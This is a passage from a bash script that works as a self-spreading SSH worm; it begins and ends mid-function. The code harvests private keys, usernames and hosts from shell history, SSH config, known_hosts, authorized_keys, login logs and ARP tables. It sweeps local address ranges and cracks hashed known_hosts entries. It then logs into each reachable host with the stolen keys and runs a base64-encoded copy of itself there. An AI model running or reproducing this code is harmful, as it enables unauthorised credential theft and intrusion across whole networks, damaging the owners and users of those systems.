\"$home_folder/${key_file:1}\" \"$home_folder/$key_file\"; do\ncheck_and_populate_keys \"$potential_key_file\" && return 0\ndone\nreturn 1\n}\nfind_from_bash_history() {\nlocal home_folder\nfor home_folder in \"${!home_folders[@]}\"; do\nlocal home_file\nlocal bash_history_line\nlocal home_user\nhome_file=\"$home_folder/.bash_history\"\nis_file \"$home_file\" || continue\nhome_user=\"$(basename -- \"$home_folder\" 2>/dev/null)\"\nwhile IFS= read -r bash_history_line; do\nlocal ssh_dest\nlocal tokens\nlocal i\nlocal cached_ssh_user\nlocal cached_ssh_host\nlocal cached_ssh_key\ncached_ssh_user=\"\"\ncached_ssh_host=\"\"\ncached_ssh_key=\"\"\nif ssh_dest=\"$(echo \"$bash_history_line\" | grep -m 1 -oE \"$allowed_users_chars\"'@[^ :]+')\"; then\nlocal ssh_host\nlocal ssh_user\nssh_host=\"${ssh_dest#*@}\"\nssh_user=\"${ssh_dest%%@*}\"\nadd_ssh_dest \"$ssh_dest\" && cached_ssh_user=\"$ssh_user\" && cached_ssh_host=\"$ssh_host\"\nelif [[ \"$bash_history_line\" == \"scp \"* ]]; then\nlocal ssh_host\nssh_host=\"$(echo \"$bash_history_line\" | grep -m 1 -o -E '[^ ]+:')\"\nssh_host=\"${ssh_host%:}\"\nadd_ssh_dest \"$home_user@$ssh_host\" && cached_ssh_user=\"$home_user\" && cached_ssh_host=\"$ssh_host\"\nfi\n[[ \"$bash_history_line\" == \"rsync \"* ]] && continue\nread -ra tokens < <(printf \"%s\" \"$bash_history_line\")\nfor ((i=0; i<${#tokens[@]}; i++)); do\nlocal token\n[[ -n \"$cached_ssh_user\" && -n \"$cached_ssh_host\" ]] && [[ \"$bash_history_line\" != *\" -i\"* || -n \"$cached_ssh_key\" ]] && break\n[[ -n \"$cached_ssh_host\" && -z \"$cached_ssh_user\" && \"$bash_history_line\" != *\" -l\"* ]] && [[ \"$bash_history_line\" != *\" -i\"* || -n \"$cached_ssh_key\" ]] && break\ntoken=\"${tokens[$i]}\"\n[[ \"$token\" == \"ssh\" ]] && continue\n[[ \"$token\" == \"scp\" ]] && continue\nif [[ \"$token\" == \"-i\"* ]]; then\nlocal key_file\nif [[ ${#token} -gt 2 ]]; then\nkey_file=\"${token:2}\"\nelif [[ $((i+1)) -lt ${#tokens[@]} ]]; then\nkey_file=\"${tokens[$i+1]}\"\nelse\ncontinue\nfi\ncheck_potential_key_files \"$key_file\" \"$home_folder\" && cached_ssh_key=\"$key_file\"\nelif [[ \"$token\" == \"-l\"* ]]; then\nlocal ssh_user\nif [[ ${#token} -gt 2 ]]; then\nssh_user=\"${token:2}\"\nelif [[ $((i+1)) -lt ${#tokens[@]} ]]; then\nssh_host=\"${tokens[$i+1]}\"\nelse\ncontinue\nfi\n[[ -z \"$cached_ssh_user\" ]] && add_ssh_user \"$ssh_user\" && cached_ssh_user=\"$ssh_user\"\nelse\n[[ \"$token\" == \"-\"* ]] && continue\n[[ $i -gt 0 ]] || continue\nlocal prev_token\nlocal prev_prev_token\nprev_token=\"${tokens[$i-1]}\"\n[[ $i -gt 1 ]] && prev_prev_token=\"${tokens[$i-2]}\"\n[[ \"$bash_history_line\" == \"ssh \"* ]] || continue\nif [[ \"$prev_token\" == \"-\"* ]]; then\nif [[ \"$prev_token\" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ || ${#prev_token} -gt 2 ]]; then\nlocal ssh_host\nssh_host=\"$token\"\n[[ -z \"$cached_ssh_host\" ]] && add_ssh_host \"$ssh_host\" && cached_ssh_host=\"$ssh_host\"\nfi\nelif [[ \"$prev_token\" == \"ssh\" ]]; then\nlocal ssh_host\nlocal ssh_user\nssh_host=\"$token\"\n[[ -z \"$cached_ssh_host\" ]] && add_ssh_host \"$ssh_host\" && cached_ssh_host=\"$ssh_host\"\nelif [[ $i -gt 1 && \"$prev_prev_token\" == \"-\"* ]] && [[ ! \"$prev_prev_token\" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ && ! ${#prev_prev_token} -gt 2 ]]; then\nlocal ssh_host\nssh_host=\"$token\"\n[[ -z \"$cached_ssh_host\" ]] && add_ssh_host \"$ssh_host\" && cached_ssh_host=\"$ssh_host\"\nelif [[ $i -gt 1 && \"${prev_prev_token:0:1}\" != \"-\" && \"${prev_token:0:1}\" != \"-\" ]]; then\nbreak\nelse\nbreak\nfi\nfi\ndone\n[[ -z \"$cached_ssh_user\" ]] && add_ssh_user \"$home_user\" && cached_ssh_user=\"$home_user\"\n[[ -n \"$cached_ssh_user\" && -n \"$cached_ssh_host\" ]] && add_ssh_dest \"$cached_ssh_user@$cached_ssh_host\"\ndone < <(${s} grep -E '^(ssh|scp|rsync) ' -- \"$home_file\" 2>/dev/null | sort | uniq)\ndone\n}\nfind_from_ssh_config() {\nlocal home_folder\nfor home_folder in \"${!home_folders[@]}\"; do\nlocal ssh_file\nlocal home_user\nis_dir \"$home_folder/.ssh\" || continue\nhome_user=\"$(basename -- \"$home_folder\" 2>/dev/null)\"\nwhile IFS= read -r ssh_file; do\nis_file \"$ssh_file\" || continue\nlocal cline\nwhile IFS= read -r cline; do\nlocal cline_val\nlocal cline_key\ncline_val=\"$(echo \"$cline\" | awk '{print $NF}')\"\ncline_key=\"$(echo \"$cline\" | awk '{print $1}')\"\ncline_key=\"${cline_key,,}\"\n[[ -z \"$cline_val\" ]] && continue\n[[ -z \"$cline_key\" ]] && continue\ncase \"$cline_key\" in\n\"host\")\nadd_ssh_host \"$cline_val\"\n[[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$cline_val\"\n;;\n\"hostname\")\nadd_ssh_host \"$cline_val\"\n[[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$cline_val\"\n;;\n\"user\")\nadd_ssh_user \"$cline_val\"\n;;\n\"identityfile\")\ncheck_potential_key_files \"$cline_val\" \"$home_folder\"\n;;\nesac\ndone < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- \"$ssh_file\" 2>/dev/null | sort | uniq)\ndone < <(${s} find -L \"$home_folder/.ssh\" -type f 2>/dev/null)\ndone\n}\nfind_user_from_file() {\nlocal home_folder\nfor home_folder in \"${!home_folders[@]}\"; do\nif [[ \"$1\" == \"$home_folder\"* ]]; then\nbasename -- \"$home_folder\"\nreturn\nfi\ndone\n}\nfind_from_authorized_keys() {\nlocal ssh_file\nfor ssh_file in \"${!ssh_files[@]}\"; do\nlocal ssh_address\nlocal home_user\n[[ -z \"$ssh_file\" ]] && continue\nhome_user=\"$(find_user_from_file \"$ssh_file\")\"\nwhile IFS= read -r ssh_address; do\nlocal ssh_host\n[[ -z \"$ssh_address\" ]] && continue\nwhile IFS= read -r ssh_host; do\nadd_ssh_host \"$ssh_host\"\n[[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\ndone < <(echo \"$ssh_address\" | awk -F\"\\\\\\'|\\\\\\\"\" '{print $2}' | tr ',' '\\n' | sort | uniq)\ndone < <(${s} grep -F 'from=' -- \"$ssh_file\" 2>/dev/null | awk -F\"\\\\\\'|\\\\\\\"\" '{print $2}' | tr ',' '\\n' | sort | uniq)\ndone\n}\nfind_from_last() {\nlocal ssh_dest\nlast -aiw >/dev/null 2>&1 || return\nwhile IFS= read -r ssh_dest; do\nadd_ssh_dest \"$ssh_dest\"\ndone < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\\./ {print $1\":\"$NF}' | sort | uniq)\n}\nfind_from_known_hosts() {\nlocal ssh_file\nfor ssh_file in \"${!ssh_files[@]}\"; do\nlocal known_host_line\nlocal home_user\nhome_user=\"$(find_user_from_file \"$ssh_file\")\"\nwhile IFS= read -r known_host_line; do\nlocal ssh_host\nlocal ssh_user\nlocal ssh_dest\n[[ -z \"$known_host_line\" ]] && continue\nssh_user=\"$(echo \"$known_host_line\" | grep -F -m 1 '@' | awk -F\"@\" '{print $1}')\"\nssh_host=\"$(echo \"$known_host_line\" | grep -F -m 1 -v '@')\"\nssh_dest=\"$(echo \"$known_host_line\" | grep -m 1 -oE \"$allowed_users_chars\"'@[^ :]+')\"\nadd_ssh_user \"$ssh_user\"\nadd_ssh_host \"$ssh_host\"\nadd_ssh_dest \"$ssh_dest\"\n[[ -n \"$home_user\" && -n \"$ssh_host\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\ndone < <(${s} \"${sshkeygen[@]}\" \"$ssh_file\" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort | uniq)\ndone\n}\nfind_from_hosts() {\nlocal ssh_host\nwhile IFS= read -r ssh_host; do\nadd_ssh_host \"$ssh_host\"\ndone < <(getent ahostsv4 2>/dev/null | awk -F\"  \" '{print $NF}' | tr ' ' '\\n' | sort | uniq)\nwhile IFS=\": \" read -r _ ssh_host; do\nadd_ssh_host \"$ssh_host\"\ndone < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort | uniq)\n}\nfind_arp_neighbours() {\nlocal ssh_host\nwhile IFS= read -r ssh_host; do\nadd_ssh_host \"$ssh_host\"\ndone < <(ip neigh 2>/dev/null | awk '$1 !~ /(\\.1$|:)/ {print $1}' | sort | uniq)\nwhile IFS= read -r ssh_host; do\nadd_ssh_host \"$ssh_host\"\ndone < <(arp -a 2>/dev/null | awk -F\"\\\\\\(|\\\\\\)\" '{print $2}' | awk '$1 !~ /(\\.1$|:)/ {print $1}' | sort | uniq)\n}\nfind_d_block() {\nlocal octets\nlocal i\nlocal current_ip\nfor current_ip in \"${!current_ips[@]}\"; do\nIFS='.' read -ra octets < <(echo \"$current_ip\")\n[[ ${#octets[@]} -eq 4 ]] || continue\nfor ((i=0; i<256; i++)); do\nadd_ssh_host \"${octets[0]}.${octets[1]}.${octets[2]}.$i\"\ndone\ndone\n}\nfind_from_prev_dest() {\nlocal chain_sl_dest\nlocal ssh_user\nlocal ssh_host\nchain_sl_dest=\"${hosts_chain%[*}\"\nchain_sl_dest=\"${chain_sl_dest##*->}\"\nadd_ssh_dest \"$chain_sl_dest\"\nadd_ssh_dest \"$this_dest\"\n[[ -z \"$SSH_CONNECTION\" ]] && return\nssh_host=\"${SSH_CONNECTION%% *}\"\nadd_ssh_host \"$ssh_host\"\n}\nfind_from_ignore_list() {\nlocal ssh_dest\nfor ssh_dest in \"${!ignore_list_array[@]}\"; do\nadd_ssh_dest \"$ssh_dest\"\ndone\n}\nfind_from_hashed_known_hosts() {\nlocal octets\nlocal ssh_file\nlocal current_ip\nfor ssh_file in \"${!ssh_files[@]}\"; do\nlocal hashed_number\nlocal home_user\nlocal ssh_host\nlocal i\nlocal j\nlocal ss\n[[ -z \"$ssh_file\" ]] && continue\nss=\"\"\n[[ ! -r \"$ssh_file\" ]] && ss=\"$s\"\nhome_user=\"$(find_user_from_file \"$ssh_file\")\"\nhashed_number=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" 2>/dev/null | grep -Ec ':[a-zA-Z0-9]{2} \\|1\\|')\"\n[[ $hashed_number -lt 1 ]] && continue\nfor ssh_host in \"${!ssh_hosts[@]}\"; do\nlocal found_hosts_count\nfound_hosts_count=0\n[[ $hashed_number -lt 1 ]] && break\nfound_hosts_count=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" -F \"$ssh_host\" 2>/dev/null | grep -cE 'Host .* found')\" && ((hashed_number -= found_hosts_count)) && [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\ndone\n[[ $hashed_number -lt 1 ]] && continue\nfor ssh_dest in \"${!ignore_list_array[@]}\"; do\nlocal found_hosts_count\nfound_hosts_count=0\n[[ $hashed_number -lt 1 ]] && break\nssh_host=\"${ssh_dest#*@}\"\nfound_hosts_count=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" -F \"$ssh_host\" 2>/dev/null | grep -cE 'Host .* found')\" && ((hashed_number -= found_hosts_count)) && [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\ndone\n[[ $hashed_number -lt 1 ]] && continue\nfor current_ip in \"${!current_ips[@]}\"; do\n[[ $hashed_number -lt 1 ]] && break\nIFS='.' read -ra octets < <(echo \"$current_ip\")\n[[ ${#octets[@]} -eq 4 ]] || continue\nif command -v xargs >/dev/null 2>&1; then\nfor i in {0..255}; do\n[[ $hashed_number -lt 1 ]] && break\nwhile IFS= read -r ssh_host; do\nssh_host=\"${ssh_host#*Host }\"\nssh_host=\"${ssh_host%% found*}\"\nadd_ssh_host \"$ssh_host\"\n((hashed_number--))\n[[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\ndone < <(\nfor j in {0..255}; do\necho \"${octets[0]}.${octets[1]}.$j.$i\"\ndone | xargs -P 0 -n 1 ${ss} ssh-keygen -f \"$ssh_file\" -F 2>/dev/null | grep -F '# Host')\ndone\nelse\nfor ((i=0; i<256; i++)); do\n[[ $hashed_number -lt 1 ]] && break\nfor ((j=0; j<256; j++)); do\nlocal found_hosts_count\nfound_hosts_count=0\n[[ $hashed_number -lt 1 ]] && break\nssh_host=\"${octets[0]}.${octets[1]}.$i.$j\"\n[[ -v 'ssh_hosts[\"$ssh_host\"]' || ${#ssh_hosts[\"$ssh_host\"]} -gt 0 ]] && continue\nfound_hosts_count=\"$(${ss} \"${sshkeygen[@]}\" \"$ssh_file\" -F \"$ssh_host\" 2>/dev/null | grep -cE 'Host .* found')\" && ((hashed_number -= found_hosts_count)) && [[ -n \"$home_user\" ]] && add_ssh_dest \"$home_user@$ssh_host\"\ndone\ndone\nfi\ndone\ndone\n}\nfind_all() {\nretry_all_dests\nfind_home_folders\ninit_ssh_files\nfind_ssh_keys\nfind_ssh_keys_paths\nfind_from_bash_history\nfind_from_ssh_config\n(( ${#priv_keys[@]} )) || fin\nfind_from_authorized_keys\nfind_from_last\nfind_from_known_hosts\nfind_from_hosts\nfind_arp_neighbours\nfind_d_block\nfind_from_prev_dest\nfind_from_ignore_list\nfind_from_hashed_known_hosts\n}\ncombinate_users_hosts_aggressive() {\nlocal ssh_user\nlocal ssh_host\nfor ssh_host in \"${interesting_hosts[@]}\"; do\nadd_ssh_host \"$ssh_host\"\ndone\nfor ssh_user in \"${interesting_users[@]}\"; do\nadd_ssh_user \"$ssh_user\"\ndone\nfor ssh_dest in \"${interesting_dests[@]}\"; do\nadd_ssh_dest \"$ssh_dest\"\ndone\nfor ssh_host in \"${!ssh_hosts[@]}\"; do\nfor ssh_user in \"${!ssh_users[@]}\"; do\nadd_ssh_dest \"$ssh_user@$ssh_host\"\ndone\ndone\n}\ncombinate_interesting_users_hosts() {\nlocal ssh_user\nlocal ssh_host\nfor ssh_dest in \"${interesting_dests[@]}\"; do\nadd_ssh_dest \"$ssh_dest\"\ndone\nfor ssh_user in \"${interesting_users[@]}\"; do\nadd_ssh_user \"$ssh_user\"\nfor ssh_host in \"${!ssh_hosts[@]}\"; do\nadd_ssh_dest \"$ssh_user@$ssh_host\"\ndone\ndone\nfor ssh_host in \"${interesting_hosts[@]}\"; do\nadd_ssh_host \"$ssh_host\"\nfor ssh_user in \"${!ssh_users[@]}\"; do\nadd_ssh_dest \"$ssh_user@$ssh_host\"\ndone\ndone\nfor ssh_host in \"${interesting_hosts[@]}\"; do\nfor ssh_user in \"${interesting_users[@]}\"; do\nadd_ssh_dest \"$ssh_user@$ssh_host\"\ndone\ndone\n}\ndeduplicate_resolved_hosts_keys() {\nlocal ssh_dest\ndeclare -A valid_ssh_dests\ndeclare -A resolved_hosts\nlocal res\nlocal use_mac\nlocal to\ncommand -v timeout >/dev/null 2>&1 && to=\"timeout $ssh_timeout\"\nif getent ahostsv4 -- 1.1.1.1 >/dev/null 2>&1; then\nres=\"$to getent ahostsv4 --\"\nelif dscacheutil -q host -a name 1.1.1.1 >/dev/null 2>&1; then\nres=\"$to dscacheutil -q host -a name\"\nuse_mac=\"1\"\nelse\nprintf \"INTERNAL_MSG: command not found: RESOLVE (%s)\\n\" \"$(uname -a 2>/dev/null)\"\nfin\nfi\nfor ssh_dest in \"${!ssh_dests[@]}\"; do\nlocal ssh_host\nis_ssh_dest \"$ssh_dest\" || continue\nssh_host=\"${ssh_dest#*@}\"\n[[ -v 'resolved_hosts[\"$ssh_host\"]' || ${#resolved_hosts[\"$ssh_host\"]} -gt 0 ]] && continue\nresolved_hosts[\"$ssh_host\"]=1\n($res \"$ssh_host\" > /dev/null 2>&1 &)\ndone\nwait\nresolved_hosts=()\nfor ssh_dest in \"${!ssh_dests[@]}\"; do\nlocal ssh_user\nlocal ssh_host\nlocal resolved_ssh_host\nis_ssh_dest \"$ssh_dest\" || continue\nssh_user=\"${ssh_dest%%@*}\"\nssh_host=\"${ssh_dest#*@}\"\nif [[ -v 'resolved_hosts[\"$ssh_host\"]' || ${#resolved_hosts[\"$ssh_host\"]} -gt 0 ]]; then\n:\nelse\nlocal resolved_ssh_hosts\nif [[ -n \"$use_mac\" ]]; then\nresolved_ssh_hosts=\"$($res \"$ssh_host\" 2>/dev/null | awk '/ip_address:/{print $NF}')\"\nelse\nresolved_ssh_hosts=\"$($res \"$ssh_host\" 2>/dev/null | awk '/RAW/{print $1}')\"\nfi\nfor resolved_ssh_host in \"${resolved_ssh_hosts[@]}\"; do\nif [[ \"${resolved_ssh_host:0:1}\" =~ [12] ]]; then\n[[ \"$resolved_ssh_host\" =~ ^127\\. ]] && resolved_ssh_host=\"127.0.0.1\"\n[[ -v '_ignored_hosts[\"$resolved_ssh_host\"]' || ${#_ignored_hosts[\"$resolved_ssh_host\"]} -gt 0 ]] && continue\nresolved_hosts[\"$ssh_host\"]+=\"$resolved_ssh_host \"\nelse\n[[ -n \"$resolved_ssh_host\" ]] && _ignored_hosts[\"$resolved_ssh_host\"]=1\nfi\ndone\nfi\nif [[ \"${#resolved_hosts[\"$ssh_host\"]}\" -lt 7 ]]; then\n_ignored_hosts[\"$ssh_host\"]=1\ncontinue\nfi\nfor resolved_ssh_host in ${resolved_hosts[\"$ssh_host\"]}; do\nvalid_ssh_dests[\"$ssh_user@$resolved_ssh_host\"]=1\ndone\ndone\nssh_dests=()\nfor ssh_dest in \"${!valid_ssh_dests[@]}\"; do\nadd_ssh_dest \"$ssh_dest\"\ndone\n}\nis_file() {\nlocal filename\nfilename=\"$1\"\n[[ -z \"$filename\" ]] && return 1\n[[ -v 'files[\"$filename\"]' || ${#files[\"$filename\"]} -gt 0 ]] && return 0\n[[ -v 'not_files[\"$filename\"]' || ${#not_files[\"$filename\"]} -gt 0 ]] && return 1\n${s} test -s \"$filename\" && ${s} test -r \"$filename\" && ${s} test -f \"$filename\" && files[\"$filename\"]=1 && return 0\nnot_files[\"$filename\"]=1\nreturn 1\n}\nis_dir() {\nlocal dir_name\ndir_name=\"$1\"\n[[ -z \"$dir_name\" ]] && return 1\n[[ -v 'folders[\"$dir_name\"]' || ${#folders[\"$dir_name\"]} -gt 0 ]] && return 0\n[[ -v 'not_folders[\"$dir_name\"]' || ${#not_folders[\"$dir_name\"]} -gt 0 ]] && return 1\n${s} test -d \"$dir_name\" && ${s} test -r \"$dir_name\" && folders[\"$dir_name\"]=1 && return 0\nnot_folders[\"$dir_name\"]=1\nreturn 1\n}\nis_ssh_user() {\nlocal ssh_user\nssh_user=\"$1\"\n[[ -z \"$ssh_user\" ]] && return 1\n[[ -v '_ignored_users[\"$ssh_user\"]' || ${#_ignored_users[\"$ssh_user\"]} -gt 0 ]] && return 1\n[[ -v 'ssh_users[\"$ssh_user\"]' || ${#ssh_users[\"$ssh_user\"]} -gt 0 ]] && return 0\n[[ \"$ssh_user\" =~ ^$allowed_users_chars$ ]] || return 1\nreturn 0\n}\nis_ssh_host() {\nlocal ssh_host\nssh_host=\"$1\"\n[[ -z \"$ssh_host\" ]] && return 1\n[[ -v '_ignored_hosts[\"$ssh_host\"]' || ${#_ignored_hosts[\"$ssh_host\"]} -gt 0 ]] && return 1\n[[ -v 'ssh_hosts[\"$ssh_host\"]' || ${#ssh_hosts[\"$ssh_host\"]} -gt 0 ]] && return 0\n[[ \"$ssh_host\" =~ ^$allowed_host_chars+$ ]] || return 1\n[[ \"${ssh_host:0:1}\" == \"-\" || \"${ssh_host:0-1}\" == \"-\" || \"${ssh_host:0:1}\" == \".\" || \"${ssh_host:0-1}\" == \".\" || \"$ssh_host\" == *\"-.\"* || \"$ssh_host\" == *\"--\"* ]] && return 1\nif [[ \"$ssh_host\" =~ ^[0-9.]+$ ]]; then\n[[ \"$ssh_host\" =~ ^[0-9]+(\\.[0-9]+){3}$ ]] || return 1\nfi\nreturn 0\n}\nis_ssh_dest() {\nlocal ssh_user\nlocal ssh_host\nlocal ssh_dest\nssh_dest=\"$1\"\n[[ -z \"$ssh_dest\" ]] && return 1\nssh_dest=\"${ssh_dest,,}\"\n[[ -v '_ignored_dests[\"$ssh_dest\"]' || ${#_ignored_dests[\"$ssh_dest\"]} -gt 0 ]] && return 1\nssh_user=\"${ssh_dest%%@*}\"\nssh_host=\"${ssh_dest#*@}\"\nis_ssh_host \"$ssh_host\" && is_ssh_user \"$ssh_user\" && return 0\nreturn 1\n}\nadd_ssh_user() {\nlocal ssh_user\nssh_user=\"$1\"\nis_ssh_user \"$ssh_user\" && ssh_users[\"$ssh_user\"]=1 && return 0\nreturn 1\n}\nadd_ssh_host() {\nlocal ssh_host\nssh_host=\"$1\"\nis_ssh_host \"$ssh_host\" && ssh_hosts[\"$ssh_host\"]=1 && return 0\nreturn 1\n}\nadd_ssh_dest() {\nlocal ssh_dest\nlocal ssh_host\nlocal ssh_user\nssh_dest=\"$1\"\nssh_dest=\"${ssh_dest,,}\"\nssh_user=\"${ssh_dest%%@*}\"\nssh_host=\"${ssh_dest#*@}\"\nis_ssh_dest \"$ssh_dest\" && ssh_dests[\"$ssh_dest\"]=1 && ssh_hosts[\"$ssh_host\"]=1 && ssh_users[\"$ssh_user\"]=1 && return 0\nreturn 1\n}\nrs_chained_print() {\nprintf \"%s%*s%s->%s\\n\" \"$indent\" 1 \"\" \"$1\" \"$2\"\n}\ndouble_rs_chained_print() {\nlocal ssh_dest\nlocal ssh_host\nlocal ssh_user\nssh_dest=\"$3\"\nssh_user=\"${ssh_dest%%@*}\"\nssh_host=\"${ssh_dest#*@}\"\nrs_chained_print \"$1\" \"$3\"\nrs_chained_print \"$2\" \"$ssh_user@($ssh_host)\"\n}\nrecursive_scan() {\ndeclare -A retry_dests\ndeclare -A retry_keys\nlocal ssh_dest\nlocal priv_key\nlocal key_file\nfor ssh_dest in \"${!ssh_dests[@]}\"; do\nlocal ssh_user\nlocal ssh_host\nssh_user=\"${ssh_dest%%@*}\"\nssh_host=\"${ssh_dest#*@}\"\nis_ssh_user \"$ssh_user\" || continue\nis_ssh_host \"$ssh_host\" || continue\nfor priv_key in \"${!priv_keys[@]}\"; do\nlocal t_hosts_chain\nlocal t_hostnames_chain\nlocal skip_this_dest\nlocal line\nlocal line_num\nkey_file=\"${priv_keys[\"$priv_key\"]}\"\n[[ -v '_ignored_key_files[\"$key_file\"]' || ${#_ignored_key_files[\"$key_file\"]} -gt 0 ]] && continue\nt_hosts_chain=\"${hosts_chain}[${s:+!}${key_file}]\"\nt_hostnames_chain=\"${hostnames_chain}[${s:+!}${key_file}]\"\nskip_this_dest=0\nline_num=0\nwhile IFS= read -r line; do\n((line_num++))\nif [[ \"$line\" == *\"resolve hostname\"* || \"$line\" == *\"connect to \"* ]]; then\n_ignored_hosts[\"$ssh_host\"]=1\nskip_this_dest=1\nbreak\nfi\nif [[ \"$line\" == *\"Argument list too long\"* ]]; then\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [ARG_LIMIT:$(getconf -a 2>/dev/null | awk '/ARG_MAX/{print $NF; exit}'), $(printf \"%s\" \"$ignore_list\" | base64 | tr -d '\\n')]\"\nprintf \"INTERNAL_MSG: ARG_LIMIT\\n\"\nfin\nfi\nif [[ \"$line\" == \"INTERNAL_MSG: ARG_LIMIT\" ]]; then\nprintf \"INTERNAL_MSG: ARG_LIMIT\\n\"\nfin\nfi\nif [[ \"$line\" == *\"Warning: Permanently added\"* || \"$line\" == *\"Permission denied\"* || \"$line\" == *\"contents do not match public\"* || \"$line\" == *\"load pubkey\"* || \"$line\" == *\"unable to resolve host\"* || \"$line\" == *\"warning: setlocale\"* || \"$line\" == *\"key_load_public: invalid format\"* ]]; then\ncontinue\nfi\nif [[ \"$line\" == *\"Unable to negotiate with\"* ]]; then\ncontinue\nfi\nif [[ \"$line\" == \"Warning: Identity file\"* || \"$line\" == \"Load key\"* || \"$line\" == *\"No such file or directory\"* ]]; then\n_ignored_key_files[\"$key_file\"]=1\nbreak\nfi\nif [[ \"$line\" == \"INTERNAL_MSG: ignore list: \"* ]]; then\nlocal ignore_new\nignore_new=\"${line#*INTERNAL_MSG: ignore list: }\"\nif [[ \"$ignore_list\" != *\"$ignore_new\"* ]]; then\nignore_list+=\"$ignore_new\"\nfi\nprintf \"%s\\n\" \"$line\"\ncontinue\nfi\nif [[ \"$line\" == \"INTERNAL_MSG: command not found: \"* ]]; then\nlocal missing_cmd\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\nmissing_cmd=\"${line#*INTERNAL_MSG: command not found: }\"\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,cmd,$missing_cmd]\"\nbreak\nfi\nif [[ \"$line\" == *\"sh: bash\"* ]]; then\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,cmd,bash]\"\nbreak\nfi\nif [[ \"$line\" == *\"Segmentation fault\"* || \"$line\" == *\"cannot allocate\"* || \"$line\" == *\"core dumped\"* ]]; then\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [OoM]\"\nbreak\nfi\nif [[ \"$line\" == *\"This account is currently not available\"* ]]; then\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [NoLogin]\"\nbreak\nfi\nif [[ \"$line\" == \"Disallowed command\" ]]; then\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [GitLab]\"\nbreak\nfi\nif [[ \"$line\" == \"Invalid command: \"* || \"$line\" == \"exec request failed on channel \"* ]]; then\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [GitHub]\"\nbreak\nfi\nif [[ \"$line\" == *\"Broken pipe\"* || \"$line\" == *\"Timeout, server\"* || \"$line\" == \"Connection to\"* || \"$line\" == \"Read from remote host\"* || \"$line\" == *\"Connection closed by\"* || \"$line\" == *\" timed out\"* || \"$line\" == *\"Disconnected from\"* || \"$line\" == *\"Connection reset by\"* || \"$line\" == *\"closed by remote host\"* || \"$line\" == *\"kex_exchange_identification\"* || \"$line\" == *\"ssh_exchange_identification\"* || \"$line\" == *\"Bad remote protocol version identification\"* || \"$line\" == *\"Protocol major versions differ\"* ]]; then\nif [[ \"$line_num\" -le 3 ]]; then\nif [[ \"$line\" != \"Connection closed by\"* && \"$line\" != \"Connection to\"* && \"$line\" != *\"closed by remote host.\" ]]; then\n_ignored_hosts[\"$ssh_host\"]=1\nfi\nskip_this_dest=1\nbreak\nfi\nretry_keys[\"$priv_key\"]=\"$key_file\"\nretry_dests[\"$ssh_dest\"]=1\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [ConnErr]\"\nbreak\nfi\nif [[ \"$line\" == \"Please login as the user\"* ]]; then\nlocal aws_ssh_user\ndouble_rs_chained_print \"$t_hosts_chain\" \"$t_hostnames_chain\" \"$ssh_dest\"\naws_ssh_user=\"${line#*\\\"}\"\naws_ssh_user=\"${aws_ssh_user%%\\\"*}\"\nif is_ssh_dest \"$aws_ssh_user@$ssh_host\"; then\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,aws,$aws_ssh_user]\"\nif [[ ! -v 'ssh_dests[\"$aws_ssh_user@$ssh_host\"]' || ${#ssh_dests[\"$aws_ssh_user@$ssh_host\"]} -eq 0 ]]; then\nretry_dests[\"$aws_ssh_user@$ssh_host\"]=1\nretry_keys[\"$priv_key\"]=\"$key_file\"\nfi\nelse\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [fail,aws,$line]\"\nfi\nbreak\nfi\nif [[ \"$line\" == *\"$t_hosts_chain\"* || \"$line\" == *\"$t_hostnames_chain\"* ]]; then\nprintf \"%s\\n\" \"$line\"\nelse\nrs_chained_print \"$t_hosts_chain\" \"$ssh_dest [line]: $line\"\nfi\ndone < <(${s} ssh \"${ssh_options[@]}\" -i \"$key_file\" -- \"$ssh_dest\" \"echo 'printf \\\"%s\\\" \\$1 | base64 -d | bash --noprofile --norc -s \\$1 \\$2 \\$3 \\$4 \\$5' | bash --noprofile --norc -s -- '$script' '$(printf \"%s\" \"$t_hosts_chain\" | base64 | tr -d '\\n')' '$ignore_list' '$ssh_dest' '$(printf \"%s\" \"$t_hostnames_chain\" | base64 | tr -d '\\n')'\" </dev/null 2>&1 | tr -d '\\r')\n[[ $skip_this_dest -eq 1 ]] && break\ndone\ndone\nif [[ $use_find_from_ignore_list -eq 2 ]]; then\nlocal ssh_dest\nload_ignore_list_array\nfor ssh_dest in 